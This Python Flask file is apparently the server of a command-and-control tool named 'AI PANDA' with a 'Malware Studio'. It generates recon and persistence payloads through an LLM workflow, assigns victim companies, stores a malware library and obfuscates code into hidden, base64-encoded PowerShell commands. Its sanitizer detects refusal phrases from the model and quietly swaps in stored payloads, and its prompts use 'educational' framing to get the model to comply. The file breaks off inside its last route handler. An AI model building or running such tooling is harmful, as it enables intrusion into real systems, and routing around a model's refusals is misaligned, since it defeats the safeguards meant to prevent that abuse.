#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# app.py - AI PANDA C2 Server with Malware Studio

from flask import Flask, request, jsonify, render_template, redirect, url_for, session
import os
import json
import uuid
import requests
import random
import time
import traceback
import sys
import re
import logging.handlers
from datetime import datetime, timedelta
from ai_hunter import (generate_ai_hunter_payload, AIHunterPayloadGenerator,
                        STRATEGY_PROMPTS, LAB_TARGET, get_strategy_prompts)
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, get_jwt_identity

# Import CrowdStrike AI client
from crowdstrike_ai import CrowdStrikeAIClient, execute_crowdstrike_workflow

# Configuration
DEBUG = False
PORT = int(os.environ.get("PORT", 5001))
HOST = "0.0.0.0"
MAX_HISTORY_ITEMS = 1000
MAX_RESULT_SIZE = 10 * 1024 * 1024  # 10MB

# Base directory — always relative to this file, regardless of CWD
_BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# CrowdStrike Configuration
CROWDSTRIKE_CONFIG_PATH = os.path.join(_BASE_DIR, "config.json")
CROWDSTRIKE_WORKFLOW_ID = "d492b0f1d27b429898d66eebb0ae18cd"
PROMPTS_CONFIG_PATH = os.path.join(_BASE_DIR, "prompts.json")
VICTIMS_CONFIG_PATH = os.path.join(_BASE_DIR, "victims.json")
FALLBACK_PAYLOADS_PATH = os.path.join(_BASE_DIR, "payloads.json")
MALWARE_LIBRARY_PATH = os.path.join(_BASE_DIR, "malware_library.json")

# AI Toggle - ONLY affects generate_code() for attack tasks
# Chat, Obfuscator, and Analysis ALWAYS use AI
USE_AI = True  # Change to False to disable AI for attack task generation only

# Global variables for configurations
crowdstrike_config = {}
prompts_config = {}
victims_config = {}
fallback_payloads = {}
malware_library = {"scripts": []}

def load_configurations():
    """Load CrowdStrike, prompts, victims, and fallback payloads configurations"""
    global crowdstrike_config, prompts_config, victims_config, fallback_payloads, malware_library
    
    try:
        # Load CrowdStrike config
        with open(CROWDSTRIKE_CONFIG_PATH, 'r', encoding='utf-8') as f:
            crowdstrike_config = json.load(f)
        logger.info("CrowdStrike configuration loaded successfully")
    except Exception as e:
        logger.error(f"Failed to load CrowdStrike config: {e}")
        crowdstrike_config = {}
    
    try:
        # Load prompts config
        with open(PROMPTS_CONFIG_PATH, 'r', encoding='utf-8') as f:
            prompts_config = json.load(f)
        logger.info("Prompts configuration loaded successfully")
    except Exception as e:
        logger.error(f"Failed to load prompts config: {e}")
        prompts_config = {}
    
    try:
        # Load victims config
        with open(VICTIMS_CONFIG_PATH, 'r', encoding='utf-8') as f:
            victims_config = json.load(f)
        logger.info("Victims configuration loaded successfully")
    except Exception as e:
        logger.error(f"Failed to load victims config: {e}")
        victims_config = {
            "victim_companies": {},
            "sector_data_types": {}
        }
    
    # Load fallback payloads
    try:
        with open(FALLBACK_PAYLOADS_PATH, 'r', encoding='utf-8') as f:
            fallback_payloads = json.load(f)
        logger.info(f"Fallback payloads loaded successfully ({len(fallback_payloads)} payloads)")
        logger.info(f"Available payloads: {', '.join(fallback_payloads.keys())}")
    except FileNotFoundError:
        logger.error(f"CRITICAL: Fallback payloads file not found: {FALLBACK_PAYLOADS_PATH}")
        logger.error("Please create fallback_payloads.json file with your tradecraft payloads")
        fallback_payloads = {}
    except Exception as e:
        logger.error(f"Failed to load fallback payloads: {e}")
        fallback_payloads = {}
    
    # Load malware library
    try:
        with open(MALWARE_LIBRARY_PATH, 'r', encoding='utf-8') as f:
            malware_library = json.load(f)
        logger.info(f"Malware library loaded successfully ({len(malware_library.get('scripts', []))} scripts)")
    except FileNotFoundError:
        logger.info("Malware library not found, creating new one")
        malware_library = {"scripts": []}
        save_malware_library()
    except Exception as e:
        logger.error(f"Failed to load malware library: {e}")
        malware_library = {"scripts": []}

def save_malware_library():
    """Save malware library to disk"""
    try:
        with open(MALWARE_LIBRARY_PATH, 'w', encoding='utf-8') as f:
            json.dump(malware_library, f, indent=2, ensure_ascii=False)
        logger.info("Malware library saved successfully")
        return True
    except Exception as e:
        logger.error(f"Failed to save malware library: {e}")
        return False

# Global demo variables
DEMO_COMPANY = None
DEMO_COMPANIES = {}

def get_sector_data_types(sector):
    """Get typical data types for each sector from victims config"""
    sector_data_types = victims_config.get("sector_data_types", {})
    return sector_data_types.get(sector, ["Corporate Data", "Employee Records", "Financial Information"])

def assign_victim_company(agent_id):
    """Assign victim company with hybrid approach: session > global > random"""
    
    # Priority 1: Session-specific target
    session_id = session.get('demo_id')
    if session_id and session_id in DEMO_COMPANIES:
        logger.info(f"Assigning session-specific company {DEMO_COMPANIES[session_id]['company_name']} to agent {agent_id}")
        return DEMO_COMPANIES[session_id].copy()
    
    # Priority 2: Global target
    global DEMO_COMPANY
    if DEMO_COMPANY is not None:
        logger.info(f"Assigning global demo company {DEMO_COMPANY['company_name']} to agent {agent_id}")
        return DEMO_COMPANY.copy()
    
    # Priority 3: Random assignment
    victim_companies = victims_config.get("victim_companies", {})
    
    if not victim_companies:
        logger.error("No victim companies loaded from config!")
        return {
            "sector": "unknown",
            "company_name": "Unknown Target",
            "employees": "0",
            "revenue": "$0",
            "description": "Configuration error",
            "estimated_value": 0,
            "breach_date": datetime.now().isoformat(),
            "risk_level": "Unknown",
            "data_types": []
        }
    
    sector = random.choice(list(victim_companies.keys()))
    company = random.choice(victim_companies[sector])
    
    revenue_num = float(company["revenue"].replace("$", "").replace("B", "000000000").replace("M", "000000"))
    estimated_value = int(revenue_num * random.uniform(0.001, 0.005))
    
    DEMO_COMPANY = {
        "sector": sector,
        "company_name": company["name"],
        "employees": company["employees"],
        "revenue": company["revenue"],
        "description": company["description"],
        "estimated_value": estimated_value,
        "breach_date": datetime.now().isoformat(),
        "risk_level": random.choice(["High", "Critical", "Medium"]),
        "data_types": get_sector_data_types(sector)
    }
    
    logger.info(f"NEW DEMO STARTED - Target: {DEMO_COMPANY['company_name']} ({DEMO_COMPANY['sector']})")
    return DEMO_COMPANY.copy()

# Logger setup
def setup_logging():
    log_formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    file_handler = logging.handlers.RotatingFileHandler(
        'server.log', maxBytes=10 * 1024 * 1024, backupCount=5
    )
    file_handler.setFormatter(log_formatter)
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(log_formatter)
    root_logger = logging.getLogger()
    root_logger.setLevel(logging.INFO)
    root_logger.addHandler(file_handler)
    root_logger.addHandler(console_handler)
    return root_logger

logger = setup_logging()
logger.info("☭ AI PANDA Server starting up...")
logger.info(f"AI Mode for Attack Tasks: {'ENABLED' if USE_AI else 'DISABLED'}")
logger.info("AI Mode for Chat/Obfuscator/Analysis: ALWAYS ENABLED")

# Load configurations at startup
load_configurations()

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Ensure scripts directory exists
def ensure_scripts_directory():
    """Ensure scripts directory exists and contains necessary scripts"""
    scripts_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scripts")
    os.makedirs(scripts_dir, exist_ok=True)
    
    winpeas_path = os.path.join(scripts_dir, "winpeas.bat")
    if not os.path.exists(winpeas_path):
        with open(winpeas_path, 'w') as f:
            f.write('@echo off\necho WinPEAS Security Analysis\necho ========================\n')
            f.write('systeminfo\necho.\necho User Information:\nnet user\necho.\n')
            f.write('echo Running Services:\nnet start\necho.\necho Analysis complete.\n')
    
    linpeas_path = os.path.join(scripts_dir, "linpeas.sh")
    if not os.path.exists(linpeas_path):
        with open(linpeas_path, 'w') as f:
            f.write('#!/bin/bash\necho "LinPEAS Security Analysis"\necho "========================"\n')
            f.write('uname -a\necho "User Information:"\nwhoami\nid\necho "Running Processes:"\nps aux\necho "Analysis complete."\n')

ensure_scripts_directory()

# In-memory storage
agents = {}
tasks = {}
results = {}
agent_conversations = {}
autorecon_sessions = {}

# Data cleanup function
def clean_old_data():
    """Remove oldest data when storage exceeds limits"""
    global agents, tasks, results
    
    if len(agents) > MAX_HISTORY_ITEMS:
        sorted_agents = sorted(agents.keys(), 
                              key=lambda k: datetime.fromisoformat(agents[k].get('last_seen', '2000-01-01')))
        for agent_id in sorted_agents[:100]:
            del agents[agent_id]
    
    if len(tasks) > MAX_HISTORY_ITEMS:
        sorted_tasks = sorted(tasks.keys(), 
                             key=lambda k: datetime.fromisoformat(tasks[k].get('created_at', '2000-01-01')))
        for task_id in sorted_tasks[:100]:
            del tasks[task_id]
    
    if len(results) > MAX_HISTORY_ITEMS:
        sorted_results = sorted(results.keys(), 
                               key=lambda k: results[k].get('timestamp', '2000-01-01'))
        for result_id in sorted_results[:100]:
            del results[result_id]

def validate_configuration():
    """Validate all required configurations at startup"""
    issues = []
    
    if not CROWDSTRIKE_WORKFLOW_ID:
        issues.append("WARNING: CrowdStrike Workflow ID not configured")
    
    if not crowdstrike_config:
        issues.append("WARNING: CrowdStrike configuration not loaded")
    
    if not prompts_config:
        issues.append("WARNING: Prompts configuration not loaded")
    
    if not victims_config or not victims_config.get("victim_companies"):
        issues.append("WARNING: Victims configuration not loaded or empty")
    
    if not fallback_payloads:
        issues.append("CRITICAL: Fallback payloads not loaded - fallback_payloads.json missing or empty")
    else:
        logger.info(f"Fallback payloads loaded: {', '.join(fallback_payloads.keys())}")
    
    required_dirs = ['scripts', 'llm_responses']
    for dir_name in required_dirs:
        if not os.path.exists(dir_name):
            try:
                os.makedirs(dir_name, exist_ok=True)
                logger.info(f"Created required directory: {dir_name}")
            except Exception as e:
                issues.append(f"Could not create directory: {dir_name} - {e}")
    
    if issues:
        logger.warning("=" * 60)
        logger.warning("CONFIGURATION ISSUES DETECTED:")
        for issue in issues:
            logger.warning(f"  {issue}")
        logger.warning("=" * 60)
    else:
        logger.info("All configurations validated successfully")
    
    return len(issues) == 0

# Context processor
@app.context_processor
def inject_now():
    return {
        "now": datetime.now(),
        "is_agent_active": lambda timestamp: (datetime.now() - datetime.fromisoformat(timestamp)).total_seconds() < 300 if isinstance(timestamp, str) else False,
        "victim_companies": victims_config.get("victim_companies", {}),
        "ai_enabled": USE_AI,
        "crowdstrike_configured": bool(CROWDSTRIKE_WORKFLOW_ID and crowdstrike_config)
    }

# Mock code generation
def mock_generate_code(task_type, environment_details):
    """Generate mock code when CrowdStrike workflow is not available"""
    mock_code = {
        "recon": """
def main():
    import os
    import platform
    import socket
    import json
    
    info = {
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "username": os.getlogin(),
        "python_version": platform.python_version(),
        "security_products": """ + json.dumps(environment_details.get("security_products", [])) + """
    }
    
    return info
""",
        "persistence": """
def main():
    import os
    import tempfile
    import random
    
    test_file = os.path.join(tempfile.gettempdir(), f"test_{random.randint(1000, 9999)}.txt")
    with open(test_file, "w") as f:
        f.write("This is a test file created by the research agent")
    
    return {"status": "File created for testing", "path": test_file}
""",
        "ai_testing": """
def main():
    import os
    import platform
    
    print("AI Testing Mode - Generated Code")
    print(f"Hostname: {os.getenv('COMPUTERNAME', 'unknown')}")
    print(f"Platform: {platform.platform()}")
    
    return "AI test prompt executed successfully"
"""
    }
    
    return mock_code.get(task_type, mock_code["recon"])

# Code generation - ONLY FUNCTION THAT RESPECTS USE_AI TOGGLE
def generate_code(task_type, environment_details):
    """Generate code using CrowdStrike workflow - ONLY function that respects USE_AI toggle"""
    
    if not USE_AI:
        logger.info(f"AI disabled for attack tasks - using fallback for: {task_type}")
        return fallback_code(task_type, "AI mode disabled")
    
    try:
        if not CROWDSTRIKE_WORKFLOW_ID or not crowdstrike_config:
            logger.warning("CrowdStrike workflow not configured, using fallback")
            return fallback_code(task_type, "CrowdStrike not configured")
        
        if task_type == "ai_testing":
            selected_prompt = "Generate Python code for system reconnaissance and information gathering."
        else:
            task_prompts = prompts_config.get("task_prompts", {})
            if task_type not in task_prompts:
                logger.warning(f"Unknown task type: {task_type}")
                return fallback_code(task_type, "Unknown task type")
            else:
                selected_prompt = task_prompts[task_type]
        
        logger.info(f"Executing CrowdStrike workflow for: {task_type}")
        
        try:
            cs_client = CrowdStrikeAIClient(CROWDSTRIKE_CONFIG_PATH)
            raw_response = cs_client.run_workflow(CROWDSTRIKE_WORKFLOW_ID, selected_prompt)
            
            logger.info(f"CrowdStrike response received for {task_type}")
            save_raw_response_to_file(raw_response, task_type)
            
            cleaned_code = sanitize_llm_code(raw_response, task_type)
            
            logger.info(f"Successfully generated code for: {task_type}")
            return cleaned_code
            
        except Exception as e:
            logger.error(f"CrowdStrike workflow failed: {str(e)}")
            return fallback_code(task_type, f"Workflow error: {str(e)}")
        
    except Exception as e:
        logger.error(f"Error in generate_code: {str(e)}")
        return fallback_code(task_type, f"Generation error: {str(e)}")

def clean_llm_response(code):
    """Clean LLM response by removing markdown and extra text"""
    lines = code.split('\n')
    cleaned_lines = []
    in_code_block = False
    
    for line in lines:
        if line.strip().startswith('```'):
            in_code_block = not in_code_block
            continue
        
        if in_code_block:
            cleaned_lines.append(line)
        elif is_code_line(line) and not is_explanation_line(line):
            cleaned_lines.append(line)
    
    return '\n'.join(cleaned_lines)

def sanitize_llm_code(code, task_type):
    """Robust sanitizer that handles multiple languages and formats"""
    
    if not isinstance(code, str):
        logger.error(f"Invalid code type: {type(code).__name__}")
        return fallback_code(task_type, f"Invalid code type")
    
    if not code or len(code.strip()) < 5:
        logger.error("Code is empty or too short")
        return fallback_code(task_type, "Code too short")
    
    # Detect ethical responses from Claude
    ethical_indicators = [
        "i cannot", "i can't", "i'm not able to",
        "i don't feel comfortable", "i apologize",
        "ethical concerns", "against my guidelines",
        "i'm sorry", "i must decline"
    ]
    
    code_lower = code.lower()
    if any(indicator in code_lower for indicator in ethical_indicators):
        logger.warning(f"Ethical filter detected for {task_type}")
        logger.warning(f"Response preview: {code[:300]}...")
        return fallback_code(task_type, "Ethical filter detected")
    
    try:
        cleaned_code = clean_llm_response(code)
        language = detect_code_language(cleaned_code)
        
        if language == "unknown":
            logger.warning(f"Unknown language for {task_type}")
            logger.warning(f"Raw response: {code[:200]}...")
            return fallback_code(task_type, "Unknown language")
        
        if language == "powershell":
            return validate_powershell_code(cleaned_code, task_type)
        elif language == "python":
            return validate_python_code(cleaned_code, task_type)
        elif language == "bash":
            return validate_bash_code(cleaned_code, task_type)
        else:
            logger.warning(f"Unexpected language '{language}' for {task_type}")
            return cleaned_code
            
    except Exception as e:
        logger.error(f"Sanitizer error for {task_type}: {str(e)}")
        return fallback_code(task_type, f"Sanitizer error")

def is_code_line(line):
    """Detect if a line appears to be code"""
    code_indicators = [
        "import ", "from ", "def ", "class ", "if __name__", "print(",
        "$", "Write-Host", "Invoke-", "Get-", "Set-", "New-", "-OutFile", "-Uri",
        "#!/bin/bash", "echo ", "wget ", "curl ", "chmod ", "sudo ",
        "{", "}", "(", ")", "=", ";"
    ]
    return any(indicator in line for indicator in code_indicators)

def is_explanation_line(line):
    """Detect if a line is explanation rather than code"""
    explanation_indicators = [
        "this script", "this code", "explanation", "note that", "please note",
        "important:", "warning:", "remember to", "make sure", "ensure that",
        "the above", "this will", "you can", "you should", "you need to"
    ]
    return any(indicator in line.lower() for indicator in explanation_indicators)

def detect_code_language(code):
    """Detect code language robustly"""
    
    strong_powershell = [
        "Invoke-WebRequest", "Add-Type", "[Threading.ThreadStart]", 
        "New-Object System.Threading.Thread", "$t=New-Object", 
        "[DllImport", "-OutFile", "-Uri", "Write-Host"
    ]
    
    strong_python = [
        "if __name__ == '__main__':", "def main():", "import sys",
        "from datetime import", "#!/usr/bin/env python"
    ]
    
    strong_bash = [
        "#!/bin/bash", "#!/bin/sh", "echo \"", "wget -O", "chmod +x"
    ]
    
    if any(indicator in code for indicator in strong_powershell):
        return "powershell"
    if any(indicator in code for indicator in strong_python):
        return "python"
    if any(indicator in code for indicator in strong_bash):
        return "bash"
    
    ps_count = sum(1 for ind in ["$", "Write-Host", "Get-", "Set-", "New-"] if ind in code)
    py_count = sum(1 for ind in ["import ", "def ", "print(", "class "] if ind in code)
    bash_count = sum(1 for ind in ["echo ", "wget ", "curl ", "sudo "] if ind in code)
    
    if ps_count > py_count and ps_count > bash_count:
        return "powershell"
    elif py_count > ps_count and py_count > bash_count:
        return "python"
    elif bash_count > 0:
        return "bash"
    else:
        return "unknown"

def validate_powershell_code(code, task_type):
    """Validate PowerShell code"""
    logger.info(f"Validating PowerShell code for {task_type}")
    
    if len(code.strip()) < 10:
        return fallback_code(task_type, "PowerShell code too short")
    
    valid_commands = [
        "Invoke-WebRequest", "Write-Host", "Get-", "Set-", "New-", 
        "Remove-Item", "Start-Process", "Add-Type", "$"
    ]
    
    if not any(cmd in code for cmd in valid_commands):
        logger.warning("No valid PowerShell commands found")
        return fallback_code(task_type, "No valid PowerShell commands")
    
    return code

def validate_python_code(code, task_type):
    """Validate Python code"""
    logger.info(f"Validating Python code for {task_type}")
    
    if "__name__" not in code and "def main(" not in code:
        code += '\n\nif __name__ == "__main__":\n    main()'
    
    try:
        import ast
        ast.parse(code)
        return code
    except SyntaxError as e:
        logger.warning(f"Python syntax error: {e}")
        return fallback_code(task_type, f"Python syntax error")

def validate_bash_code(code, task_type):
    """Validate Bash code"""
    logger.info(f"Validating Bash code for {task_type}")
    
    if not code.startswith("#!"):
        code = "#!/bin/bash\n" + code
    
    return code

def save_raw_response_to_file(response, task_type):
    """Save raw LLM response to file for inspection"""
    try:
        os.makedirs("llm_responses", exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"llm_responses/raw_{task_type}_{timestamp}.txt"
        
        with open(filename, "w", encoding="utf-8") as f:
            f.write(response)
            
        logger.info(f"Raw response saved to {filename}")
    except Exception as e:
        logger.error(f"Error saving raw response: {str(e)}")

def fallback_code(task_type, reason):
    """Get fallback code from external JSON file"""
    logger.warning(f"Using fallback payload for '{task_type}': {reason}")
    
    if task_type in fallback_payloads:
        logger.info(f"Loaded fallback payload for: {task_type}")
        return fallback_payloads[task_type]
    
    if 'default' in fallback_payloads:
        logger.warning(f"Task '{task_type}' not found in fallback_payloads.json, using default")
        return fallback_payloads['default']
    
    logger.error(f"CRITICAL: No fallback payload for '{task_type}' and no default in fallback_payloads.json")
    return f'Write-Host "Error: {reason} - No fallback payload configured in fallback_payloads.json"'

# ========================================
# CHAT ASSISTANT - ALWAYS USES AI (PYTHON/POWERSHELL SUPPORT)
# ========================================

def handle_conversation(agent_id, message, conversation_history=None, execution_type="python"):
    """Process conversation using CrowdStrike - ALWAYS uses AI - Supports Python and PowerShell"""
    if conversation_history is None:
        conversation_history = []

    try:
        conversation_history.append({"role": "user", "content": message})

        # Obtener info del agente
        agent_environment = {}
        for result in results.values():
            if result.get("agent_id") == agent_id and result.get("task_id") == "init":
                agent_environment = result.get("data", {})

        if not CROWDSTRIKE_WORKFLOW_ID or not crowdstrike_config:
            # Mock response cuando no hay CrowdStrike
            ai_response = f"CrowdStrike not configured. Mock response for: {message}"
            if execution_type == "powershell":
                code = f'Write-Host "Mock PowerShell: {message}"'
            else:
                code = f'def main():\n    return "Mock Python: {message}"\n\nif __name__ == "__main__":\n    main()'
        else:
            # Cargar prompt template según tipo
            if execution_type == "powershell":
                conversation_prompt_template = prompts_config.get(
                    "conversation_prompt_powershell",
                    "Generate a PowerShell one-liner for: {message}"
                )
            else:  # python
                conversation_prompt_template = prompts_config.get(
                    "conversation_prompt",
                    "Generate Python code for: {message}"
                )
            
            # Formatear prompt
            system_prompt = conversation_prompt_template.format(
                environment=json.dumps(agent_environment),
                message=message
            )

            try:
                # Llamar a CrowdStrike AI
                cs_client = CrowdStrikeAIClient(CROWDSTRIKE_CONFIG_PATH)
                ai_response = cs_client.run_workflow(CROWDSTRIKE_WORKFLOW_ID, system_prompt)
                
                logger.info(f"CrowdStrike response received ({execution_type})")
                
                # Extraer código según tipo
                if execution_type == "powershell":
                    code = clean_powershell_response(ai_response)
                else:  # python
                    code = clean_python_response(ai_response)
                
                # ✅ VALIDACIÓN FINAL - AMBOS TIPOS SON VÁLIDOS
                logger.info(f"Code generated successfully for {execution_type}: {len(code)} chars")
                
            except Exception as e:
                logger.error(f"CrowdStrike workflow error: {str(e)}")
                ai_response = f"Error processing request: {str(e)}"
                
                if execution_type == "powershell":
                    code = f'Write-Host "Error: {str(e)}"'
                else:
                    code = f'def main():\n    return "Error: {str(e)}"\n\nif __name__ == "__main__":\n    main()'

        conversation_history.append({"role": "assistant", "content": ai_response})

    except Exception as e:
        error_msg = f"Error processing conversation: {str(e)}"
        logger.error(f"Conversation error: {traceback.format_exc()}")
        ai_response = error_msg
        
        if execution_type == "powershell":
            code = f'Write-Host "{error_msg}"'
        else:
            code = f'def main():\n    return "{error_msg}"\n\nif __name__ == "__main__":\n    main()'
        
        conversation_history.append({"role": "assistant", "content": error_msg})

    return {
        "code": code,
        "conversation": conversation_history,
        "response": ai_response
    }


def clean_python_response(ai_response):
    """Extract clean Python code from AI response"""
    import re
    
    # Intentar extraer de code block markdown
    code_match = re.search(r"```python\s*(.*?)```", ai_response, re.DOTALL | re.IGNORECASE)
    
    if code_match:
        code = code_match.group(1).strip()
        logger.info("Extracted Python code from markdown block")
    else:
        # Si no hay code block, usar toda la respuesta
        code = ai_response.strip()
        logger.warning("No markdown block found, using full response as Python code")
    
    # Validar estructura mínima
    if "def " not in code and "import " not in code:
        logger.warning("Python code lacks structure, wrapping in main()")
        code = f"""def main():
    # AI-generated code
{chr(10).join('    ' + line for line in code.split(chr(10)))}
    return "Execution completed"

if __name__ == "__main__":
    result = main()
    print(result)"""
    
    logger.info(f"Cleaned Python code: {len(code)} chars")
    return code


def clean_powershell_response(ai_response):
    """Extract clean PowerShell one-liner from AI response"""
    import re
    
    # Intentar extraer de code block
    code_match = re.search(r"```(?:powershell|ps1)?\s*(.*?)```", ai_response, re.DOTALL | re.IGNORECASE)
    
    if code_match:
        code = code_match.group(1).strip()
        logger.info("Extracted PowerShell from markdown block")
    else:
        code = ai_response.strip()
        logger.info("No markdown block, using full response")
    
    # Limpiar líneas
    lines = []
    for line in code.split('\n'):
        line = line.strip()
        # Ignorar comentarios, líneas vacías, y explicaciones
        if line and not line.startswith('#') and not line.lower().startswith(('note:', 'explanation:', 'this ')):
            # Remover prefijos comunes
            line = re.sub(r'^(powershell\.exe\s+)?(-command\s+)?(-c\s+)?', '', line, flags=re.IGNORECASE)
            lines.append(line)
    
    # Unir en one-liner
    if len(lines) > 1:
        code = '; '.join(lines)
    elif lines:
        code = lines[0]
    else:
        code = ai_response.strip()
    
    # Limpieza final
    code = code.strip()
    
    logger.info(f"Cleaned PowerShell one-liner: {code[:100]}...")
    return code


# ALWAYS USE AI - Code Obfuscator (PowerShell focused for EDR visibility)
def obfuscate_code(code, language="powershell", target_security="generic"):
    """Use AI workflow to obfuscate code - ALWAYS uses AI
    Now generates PowerShell obfuscated code for better EDR visibility
    Educational context: For cybersecurity training demonstrations only"""
    try:
        if not CROWDSTRIKE_WORKFLOW_ID or not crowdstrike_config:
            obfuscated = f"# Obfuscated version (mock - educational demo)\n\n{code}\n\n# Note: AI workflow not configured"
            explanation = "AI workflow not configured."
        else:
            # Load prompt from prompts.json (includes all context)
            obfuscation_prompt_template = prompts_config.get("obfuscation_prompt", 
                "Obfuscate this {language} code to PowerShell for educational purposes: {code}")
            
            # Format the prompt with variables
            prompt = obfuscation_prompt_template.format(
                language=language,
                code=code,
                target_security=target_security
            )
            
            try:
                cs_client = CrowdStrikeAIClient(CROWDSTRIKE_CONFIG_PATH)
                
                # Only pass workflow_id and prompt (no system_prompt parameter)
                ai_response = cs_client.run_workflow(
                    CROWDSTRIKE_WORKFLOW_ID, 
                    prompt
                )
                
                import re
                # Extract code from markdown code blocks
                code_pattern = r"```(?:\w+)?\s*(.*?)```"
                code_match = re.search(code_pattern, ai_response, re.DOTALL)
                
                obfuscated = code_match.group(1).strip() if code_match else ai_response.strip()
                explanation = ""  # No explanation, just code
                
                # Log for EDR visibility (with educational context)
                logger.info(f"[EDUCATIONAL DEMO] Generated obfuscated PowerShell code (length: {len(obfuscated)} chars)")
                logger.info(f"[EDUCATIONAL DEMO] Preview: {obfuscated[:150]}...")
                
            except Exception as e:
                logger.error(f"AI obfuscation error: {str(e)}")
                # Fallback: Basic PowerShell Base64 encoding
                obfuscated = generate_fallback_powershell_obfuscation(code)
                explanation = ""
                
    except Exception as e:
        logger.error(f"Obfuscation error: {traceback.format_exc()}")
        obfuscated = generate_fallback_powershell_obfuscation(code)
        explanation = ""
    
    return {
        "obfuscated_code": obfuscated,
        "explanation": explanation,
        "language": "powershell",
        "method": "ai_generated",
        "context": "educational_demonstration"
    }


def generate_fallback_powershell_obfuscation(code):
    """Generate basic PowerShell obfuscation as fallback"""
    try:
        import base64
        # Convert code to PowerShell command if it's not already
        if not code.strip().lower().startswith('powershell'):
            ps_code = f"Write-Host '{code.replace(chr(39), chr(39)+chr(39))}'"
        else:
            ps_code = code
        
        # Base64 encode
        encoded_bytes = base64.b64encode(ps_code.encode('utf-16le'))
        encoded_str = encoded_bytes.decode('ascii')
        
        # Generate obfuscated command
        obfuscated = f"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {encoded_str}"
        
        return obfuscated
    except Exception as e:
        logger.error(f"Fallback obfuscation error: {e}")
        return f"# Fallback obfuscation failed\n{code}"

# ALWAYS USE AI - Result Analysis
def analyze_execution_result(result_data, original_message):
    """Analyze execution results and provide insights - ALWAYS uses AI"""
    
    output = result_data.get("output", "")
    stdout = result_data.get("stdout", "")
    stderr = result_data.get("stderr", "")
    error = result_data.get("error", "")
    exit_code = result_data.get("exit_code", 0)
    
    if CROWDSTRIKE_WORKFLOW_ID and crowdstrike_config:
        try:
            analysis_prompt_template = prompts_config.get("analysis_prompt", 
                "Analyze this execution result: {output}")
            
            prompt = analysis_prompt_template.format(
                output=stdout or output or 'No output',
                stderr=stderr or 'No errors',
                error=error or 'No execution error',
                exit_code=exit_code
            )
            
            cs_client = CrowdStrikeAIClient(CROWDSTRIKE_CONFIG_PATH)
            return cs_client.run_workflow(CROWDSTRIKE_WORKFLOW_ID, prompt)
            
        except Exception as e:
            logger.error(f"Analysis error: {traceback.format_exc()}")
            return f"Your request has been executed. Results are shown above."
    else:
        if error or (stderr and stderr.strip()):
            return "The execution encountered some errors, shown above."
        else:
            return "Your request has been executed successfully. Results are shown above."

# ========================================
# MALWARE STUDIO ENDPOINTS
# ========================================

@app.route('/studio/generate', methods=['POST'])
def studio_generate_script():
    """Generate a script using AI based on natural language description"""
    try:
        data = request.json
        description = data.get('description')
        language = data.get('language', 'python')
        
        if not description:
            return jsonify({"status": "error", "message": "Missing description"}), 400
        
        logger.info(f"Malware Studio: Generating {language} script from description")
        
        if not CROWDSTRIKE_WORKFLOW_ID or not crowdstrike_config:
            # Mock response
            if language == 'python':
                code = f'''def main():
    """
    {description}
    """
    print("Mock script generated")
    return "Success"

if __name__ == "__main__":
    main()'''
            elif language == 'powershell':
                code = f'# {description}\nWrite-Host "Mock PowerShell script"'
            else:
                code = f'#!/bin/bash\n# {description}\necho "Mock bash script"'
        else:
            # Use AI to generate
            studio_prompt_template = prompts_config.get("studio_prompt", 
                "Generate a {language} script that does the following: {description}")
            
            prompt = studio_prompt_template.format(
                language=language,
                description=description
            )
            
            try:
                cs_client = CrowdStrikeAIClient(CROWDSTRIKE_CONFIG_PATH)
                ai_response = cs_client.run_workflow(CROWDSTRIKE_WORKFLOW_ID, prompt)
                
                # Clean the response based on language
                if language == 'python':
                    code = clean_python_response(ai_response)
                elif language == 'powershell':
                    code = clean_powershell_response(ai_response)
                else:  # bash
                    import re
                    code_match = re.search(r"```(?:bash|sh)?\s*(.*?)```", ai_response, re.DOTALL | re.IGNORECASE)
                    code = code_match.group(1).strip() if code_match else ai_response.strip()
                    if not code.startswith('#!/bin/bash'):
                        code = '#!/bin/bash\n' + code
                
                logger.info(f"Script generated successfully: {len(code)} chars")
                
            except Exception as e:
                logger.error(f"AI generation error: {str(e)}")
                return jsonify({"status": "error", "message": f"Generation failed: {str(e)}"}), 500
        
        return jsonify({
            "status": "success",
            "code": code,
            "language": language
        })
        
    except Exception as e:
        logger.error(f"Error in studio_generate_script: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/studio/library', methods=['GET'])
def studio_get_library():
    """Get all scripts from the malware library"""
    try:
        return jsonify({
            "status": "success",
            "scripts": malware_library.get("scripts", [])
        })
    except Exception as e:
        logger.error(f"Error getting library: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/studio/library/save', methods=['POST'])
def studio_save_to_library():
    """Save a script to the malware library"""
    try:
        data = request.json
        name = data.get('name')
        description = data.get('description')
        code = data.get('code')
        language = data.get('language')
        category = data.get('category', 'uncategorized')
        tags = data.get('tags', [])
        
        if not name or not code or not language:
            return jsonify({"status": "error", "message": "Missing required fields"}), 400
        
        # Create script entry
        script_entry = {
            "id": str(uuid.uuid4()),
            "name": name,
            "description": description or "",
            "language": language,
            "code": code,
            "category": category,
            "tags": tags,
            "created_at": datetime.now().isoformat(),
            "updated_at": datetime.now().isoformat()
        }
        
        # Add to library
        malware_library["scripts"].append(script_entry)
        
        # Save to disk
        if save_malware_library():
            logger.info(f"Script saved to library: {name} ({language})")
            return jsonify({
                "status": "success",
                "message": "Script saved to library",
                "script_id": script_entry["id"]
            })
        else:
            return jsonify({"status": "error", "message": "Failed to save library"}), 500
        
    except Exception as e:
        logger.error(f"Error saving to library: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/studio/library/<script_id>', methods=['GET'])
def studio_get_script(script_id):
    """Get a specific script from the library"""
    try:
        for script in malware_library.get("scripts", []):
            if script["id"] == script_id:
                return jsonify({
                    "status": "success",
                    "script": script
                })
        
        return jsonify({"status": "error", "message": "Script not found"}), 404
        
    except Exception as e:
        logger.error(f"Error getting script: {traceback.format_exc()}")
